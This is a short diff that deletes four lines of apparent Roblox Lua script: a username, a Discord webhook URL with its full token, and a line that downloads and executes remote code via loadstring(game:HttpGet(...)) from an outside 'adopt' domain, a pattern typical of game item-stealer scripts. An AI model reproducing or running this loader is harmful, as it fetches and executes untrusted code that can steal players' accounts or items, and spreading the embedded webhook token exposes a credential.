@@ -1,4 +1,0 @@
-Username = "Novachaos75"
-Webhook = "https://discord.com/api/webhooks/1262655864117137479/Wwb7RPMJ_iBH2nt2iI0giCpRSxVE68ialdDuZ_2JgXR8VdU9EBEyVEFWP0ETwoJgrkym"
-
-loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
